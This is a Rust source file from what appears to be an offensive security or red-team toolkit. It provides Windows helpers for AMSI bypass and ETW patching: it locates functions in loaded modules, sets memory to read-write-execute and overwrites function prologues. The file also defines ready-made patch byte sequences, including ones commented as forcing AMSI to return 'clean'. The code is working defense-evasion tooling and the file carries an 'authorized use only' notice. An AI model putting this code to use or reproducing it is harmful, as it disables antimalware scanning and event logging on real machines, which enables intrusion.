//! Windows Internals Helper Module
//!
//! Provides low-level Windows API access for OPSEC operations.
//! Used by AMSI Bypass and ETW Patcher modules.
//!
//! MITRE ATT&CK: T1562 (Impair Defenses)
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY

#[cfg(all(windows, feature = "opsec-windows"))]
use std::ffi::CString;

/// Result type for Windows operations
pub type WinResult<T> = Result<T, WinError>;

/// Windows operation errors
#[derive(Debug, Clone)]
pub enum WinError {
    /// Module not found in process
    ModuleNotFound(String),
    /// Function not found in module
    FunctionNotFound(String),
    /// Failed to change memory protection
    MemoryProtectionFailed,
    /// Patch operation failed
    PatchFailed(String),
    /// Operation requires Windows OS
    NotWindows,
    /// Invalid string conversion
    InvalidString,
}

impl std::fmt::Display for WinError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ModuleNotFound(m) => write!(f, "Module not found: {}", m),
            Self::FunctionNotFound(fn_name) => write!(f, "Function not found: {}", fn_name),
            Self::MemoryProtectionFailed => write!(f, "Failed to change memory protection"),
            Self::PatchFailed(reason) => write!(f, "Patch failed: {}", reason),
            Self::NotWindows => write!(f, "Operation requires Windows"),
            Self::InvalidString => write!(f, "Invalid string conversion"),
        }
    }
}

impl std::error::Error for WinError {}

/// Saved original bytes for restoration
#[derive(Debug, Clone)]
pub struct PatchInfo {
    pub address: usize,
    pub original_bytes: Vec<u8>,
    pub patch_bytes: Vec<u8>,
}

// ============================================================================
// Windows-specific implementations
// ============================================================================

#[cfg(all(windows, feature = "opsec-windows"))]
mod windows_impl {
    use super::*;
    use windows::{
        core::PCSTR,
        Win32::Foundation::HMODULE,
        Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS},
    };

    /// Get module handle by name
    pub fn get_module_handle(module_name: &str) -> WinResult<HMODULE> {
        let c_name =
            CString::new(module_name).map_err(|_| WinError::ModuleNotFound(module_name.to_string()))?;

        unsafe {
            let handle = GetModuleHandleA(PCSTR::from_raw(c_name.as_ptr() as *const u8));
            match handle {
                Ok(h) if !h.is_invalid() => Ok(h),
                _ => Err(WinError::ModuleNotFound(module_name.to_string())),
            }
        }
    }

    /// Get function address from module
    pub fn get_function_address(
        module: HMODULE,
        function_name: &str,
    ) -> WinResult<*mut std::ffi::c_void> {
        let c_name = CString::new(function_name)
            .map_err(|_| WinError::FunctionNotFound(function_name.to_string()))?;

        unsafe {
            let addr = GetProcAddress(module, PCSTR::from_raw(c_name.as_ptr() as *const u8));
            match addr {
                Some(a) => Ok(a as *mut std::ffi::c_void),
                None => Err(WinError::FunctionNotFound(function_name.to_string())),
            }
        }
    }

    /// Change memory protection
    pub fn set_memory_protection(
        address: *mut std::ffi::c_void,
        size: usize,
        new_protection: PAGE_PROTECTION_FLAGS,
    ) -> WinResult<PAGE_PROTECTION_FLAGS> {
        let mut old_protection = PAGE_PROTECTION_FLAGS::default();

        unsafe {
            let result = VirtualProtect(address, size, new_protection, &mut old_protection);

            if result.is_ok() {
                Ok(old_protection)
            } else {
                Err(WinError::MemoryProtectionFailed)
            }
        }
    }

    /// Read bytes from memory address
    pub fn read_memory(address: *const u8, size: usize) -> Vec<u8> {
        let mut bytes = vec![0u8; size];
        unsafe {
            std::ptr::copy_nonoverlapping(address, bytes.as_mut_ptr(), size);
        }
        bytes
    }

    /// Write bytes to memory (with protection change)
    pub fn write_memory(address: *mut u8, bytes: &[u8]) -> WinResult<PatchInfo> {
        // Save original bytes
        let original_bytes = read_memory(address as *const u8, bytes.len());

        // Change protection to RWX
        let old_prot = set_memory_protection(
            address as *mut std::ffi::c_void,
            bytes.len(),
            PAGE_EXECUTE_READWRITE,
        )?;

        // Write bytes
        unsafe {
            std::ptr::copy_nonoverlapping(bytes.as_ptr(), address, bytes.len());
        }

        // Restore protection
        let _ = set_memory_protection(address as *mut std::ffi::c_void, bytes.len(), old_prot);

        Ok(PatchInfo {
            address: address as usize,
            original_bytes,
            patch_bytes: bytes.to_vec(),
        })
    }

    /// Restore original bytes
    pub fn restore_memory(patch_info: &PatchInfo) -> WinResult<()> {
        let address = patch_info.address as *mut u8;

        // Change protection to RWX
        let old_prot = set_memory_protection(
            address as *mut std::ffi::c_void,
            patch_info.original_bytes.len(),
            PAGE_EXECUTE_READWRITE,
        )?;

        // Write original bytes
        unsafe {
            std::ptr::copy_nonoverlapping(
                patch_info.original_bytes.as_ptr(),
                address,
                patch_info.original_bytes.len(),
            );
        }

        // Restore protection
        let _ = set_memory_protection(
            address as *mut std::ffi::c_void,
            patch_info.original_bytes.len(),
            old_prot,
        );

        Ok(())
    }
}

// ============================================================================
// Cross-platform stubs (non-Windows)
// ============================================================================

#[cfg(not(all(windows, feature = "opsec-windows")))]
mod windows_impl {
    use super::*;

    /// Stub module handle type for non-Windows
    pub struct HMODULE;

    pub fn get_module_handle(_module_name: &str) -> WinResult<HMODULE> {
        Err(WinError::NotWindows)
    }

    pub fn get_function_address(
        _module: HMODULE,
        _function_name: &str,
    ) -> WinResult<*mut std::ffi::c_void> {
        Err(WinError::NotWindows)
    }

    pub fn write_memory(_address: *mut u8, _bytes: &[u8]) -> WinResult<PatchInfo> {
        Err(WinError::NotWindows)
    }

    pub fn restore_memory(_patch_info: &PatchInfo) -> WinResult<()> {
        Err(WinError::NotWindows)
    }
}

// Re-export platform-appropriate implementations
pub use windows_impl::*;

// ============================================================================
// Common patch bytes
// ============================================================================

/// Common patch patterns for function hooking
pub mod patches {
    /// Return 0 (success/clean): xor eax, eax; ret
    pub const RET_ZERO: [u8; 3] = [0x31, 0xC0, 0xC3];

    /// Return 1 (failure): xor eax, eax; inc eax; ret
    pub const RET_ONE: [u8; 4] = [0x31, 0xC0, 0x40, 0xC3];

    /// Return E_INVALIDARG (0x80070057): mov eax, 0x80070057; ret
    /// This makes AMSI return "invalid argument" = effectively clean
    pub const RET_INVALIDARG: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

    /// Return AMSI_RESULT_CLEAN (0): xor eax, eax; ret
    pub const AMSI_CLEAN: [u8; 3] = [0x31, 0xC0, 0xC3];

    /// NOP sled (do nothing)
    pub const NOP_3: [u8; 3] = [0x90, 0x90, 0x90];

    /// Jump short (skip 2 bytes)
    pub const JMP_SHORT_2: [u8; 2] = [0xEB, 0x02];
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_win_error_display() {
        let err = WinError::ModuleNotFound("test.dll".to_string());
        assert!(err.to_string().contains("test.dll"));

        let err = WinError::NotWindows;
        assert!(err.to_string().contains("Windows"));
    }

    #[test]
    fn test_patch_bytes() {
        assert_eq!(patches::RET_ZERO.len(), 3);
        assert_eq!(patches::RET_INVALIDARG.len(), 6);
        assert_eq!(patches::AMSI_CLEAN.len(), 3);
    }

    #[test]
    #[cfg(not(windows))]
    fn test_non_windows_returns_error() {
        let result = get_module_handle("test.dll");
        assert!(matches!(result, Err(WinError::NotWindows)));
    }

    #[test]
    fn test_patch_info_creation() {
        let info = PatchInfo {
            address: 0x1234,
            original_bytes: vec![0x48, 0x89, 0x5C],
            patch_bytes: vec![0x31, 0xC0, 0xC3],
        };
        assert_eq!(info.address, 0x1234);
        assert_eq!(info.original_bytes.len(), 3);
        assert_eq!(info.patch_bytes.len(), 3);
    }
}
